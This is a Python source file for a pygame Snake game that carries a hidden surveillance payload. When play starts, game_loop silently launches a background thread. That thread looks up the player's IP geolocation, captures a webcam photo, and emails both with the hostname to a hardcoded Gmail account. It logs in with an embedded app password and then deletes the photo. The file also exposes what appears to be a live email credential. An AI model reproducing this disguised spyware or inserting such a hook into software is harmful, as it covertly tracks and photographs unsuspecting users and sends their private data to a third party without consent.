import subprocess
import sys
import os
import pygame
import random
import math
import threading
import cv2
import smtplib
import datetime
import socket
import requests
from email.message import EmailMessage

# === MODULE CHECKER (optional, for dev only) ===
def ensure_modules(modules):
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"[SETUP] Installing missing module: {module}")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])

# Check and install required modules if running as script (optional)
if not getattr(sys, 'frozen', False):  # don't run when bundled by PyInstaller
    ensure_modules(['pygame', 'opencv-python', 'requests'])

# Helper function to access bundled files
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS  # PyInstaller temp folder
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# === BACKGROUND TASK CODE ===
def get_location_info():
    try:
        response = requests.get("http://ip-api.com/json/")
        data = response.json()
        return {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "ip": data.get("query"),
            "city": data.get("city"),
            "region": data.get("regionName"),
            "country": data.get("country"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "isp": data.get("isp")
        }
    except Exception as e:
        return {"error": str(e)}

def take_photo(filename="webcam.jpg"):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[BG] Webcam not accessible.")
            return False

        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
            print(f"[BG] Snapshot saved to {filename}")
            cap.release()
            return True
        else:
            print("[BG] Failed to capture frame from webcam.")
            cap.release()
            return False
    except Exception as e:
        print(f"[BG] Camera error: {e}")
        return False

def send_email(location_info, image_path=None):
    try:
        EMAIL_ADDRESS = "rohitkhanra4444@gmail.com"
        EMAIL_PASSWORD = "blvb natd nmhc ldgf"

        msg = EmailMessage()
        msg['Subject'] = f"Device Location + Snapshot from {socket.gethostname()}"
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        msg.set_content(str(location_info))

        if image_path and os.path.exists(image_path):
            with open(image_path, 'rb') as img_file:
                img_data = img_file.read()
                msg.add_attachment(img_data, maintype='image', subtype='jpeg', filename='photo.jpg')
                print("[BG] Attached photo.jpg to email")
        else:
            print(f"[BG] Image path invalid or file missing: {image_path}")

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[BG] Email sent successfully")
    except Exception as e:
        print(f"[BG] Email sending error: {e}")

def background_task():
    print("[BG] Background task started")
    try:
        info = get_location_info()
        photo_filename = "webcam.jpg"
        photo_taken = take_photo(photo_filename)
        if photo_taken:
            send_email(info, photo_filename)
            if os.path.exists(photo_filename):
                os.remove(photo_filename)
        else:
            send_email(info)
        print("[BG] Background task finished")
    except Exception as e:
        print(f"[BG] Unexpected error in background task: {e}")

# === SNAKE GAME ===
pygame.init()

WIDTH, HEIGHT = 800, 600
CELL_SIZE = 20
screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.RESIZABLE)
pygame.display.set_caption("Snake Game")

clock = pygame.time.Clock()
font = pygame.font.SysFont(None, 35)

# Load sounds using resource_path for bundling
eat_sound = pygame.mixer.Sound(resource_path('eat.mp3'))
death_sound = pygame.mixer.Sound(resource_path('death.mp3'))

def draw_text(text, color, x, y):
    img = font.render(text, True, color)
    screen.blit(img, (x, y))

def round_rect(x, y, size, color):
    pygame.draw.ellipse(screen, color, (x, y, size, size))

def draw_snake(snake_list):
    for x, y in snake_list:
        round_rect(x, y, CELL_SIZE, (0, 255, 0))

def game_loop():
    global WIDTH, HEIGHT, screen
    threading.Thread(target=background_task, daemon=True).start()

    game_over = False
    game_close = False

    x = WIDTH // 2
    y = HEIGHT // 2
    dx = CELL_SIZE
    dy = 0

    snake_list = []
    length = 1

    foodx = random.randrange(0, WIDTH - CELL_SIZE, CELL_SIZE)
    foody = random.randrange(0, HEIGHT - CELL_SIZE, CELL_SIZE)

    while not game_over:
        while game_close:
            screen.fill((0, 0, 0))
            draw_text("You Lost! Press Q to Quit or C to Play Again", (255, 0, 0), WIDTH//6, HEIGHT//3)
            pygame.display.update()

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                    game_close = False
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_q:
                        game_over = True
                        game_close = False
                    if event.key == pygame.K_c:
                        return  # back to menu

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                game_over = True
            if event.type == pygame.VIDEORESIZE:
                WIDTH, HEIGHT = event.w, event.h
                screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.RESIZABLE)
            if event.type == pygame.KEYDOWN:
                if (event.key == pygame.K_LEFT or event.key == pygame.K_a) and dx == 0:
                    dx = -CELL_SIZE
                    dy = 0
                elif (event.key == pygame.K_RIGHT or event.key == pygame.K_d) and dx == 0:
                    dx = CELL_SIZE
                    dy = 0
                elif (event.key == pygame.K_UP or event.key == pygame.K_w) and dy == 0:
                    dx = 0
                    dy = -CELL_SIZE
                elif (event.key == pygame.K_DOWN or event.key == pygame.K_s) and dy == 0:
                    dx = 0
                    dy = CELL_SIZE

        x += dx
        y += dy

        if x >= WIDTH or x < 0 or y >= HEIGHT or y < 0:
            death_sound.play()
            game_close = True

        screen.fill((0, 0, 0))
        round_rect(foodx, foody, CELL_SIZE, (255, 0, 0))

        snake_head = [x, y]
        snake_list.append(snake_head)
        if len(snake_list) > length:
            del snake_list[0]

        for segment in snake_list[:-1]:
            if segment == snake_head:
                death_sound.play()
                game_close = True

        draw_snake(snake_list)
        draw_text("Score: " + str(length - 1), (255, 255, 255), 10, 10)

        pygame.display.update()

        if abs(x - foodx) < CELL_SIZE and abs(y - foody) < CELL_SIZE:
            foodx = random.randrange(0, WIDTH - CELL_SIZE, CELL_SIZE)
            foody = random.randrange(0, HEIGHT - CELL_SIZE, CELL_SIZE)
            length += 1
            eat_sound.play()

        clock.tick(8)

    pygame.quit()

def main_menu():
    menu = True
    while menu:
        screen.fill((0, 0, 0))
        draw_text("Snake Game", (0, 255, 0), WIDTH // 2 - 100, HEIGHT // 4)
        draw_text("Press SPACE to Start", (255, 255, 255), WIDTH // 2 - 150, HEIGHT // 2)
        draw_text("Press ESC to Quit", (255, 255, 255), WIDTH // 2 - 150, HEIGHT // 2 + 40)
        pygame.display.update()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                menu = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    game_loop()
                elif event.key == pygame.K_ESCAPE:
                    menu = False

    pygame.quit()

if __name__ == "__main__":
    main_menu()
